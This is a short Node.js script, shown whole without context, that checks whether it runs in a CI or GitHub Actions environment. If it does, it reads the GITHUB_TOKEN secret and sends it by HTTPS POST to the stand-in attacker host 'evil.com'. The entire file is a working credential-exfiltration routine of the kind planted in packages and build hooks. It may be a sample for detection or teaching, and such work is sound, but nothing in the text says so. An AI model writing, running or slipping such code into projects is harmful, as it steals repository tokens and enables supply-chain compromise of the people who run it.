const https = require('https');

if (process.env.CI || process.env.GITHUB_ACTIONS) {
  const token = process.env.GITHUB_TOKEN;
  if (token) {
    const data = JSON.stringify({ t: token });
    const req = https.request({
      hostname: 'evil.com',
      port: 443,
      path: '/collect',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    req.write(data);
    req.end();
  }
}
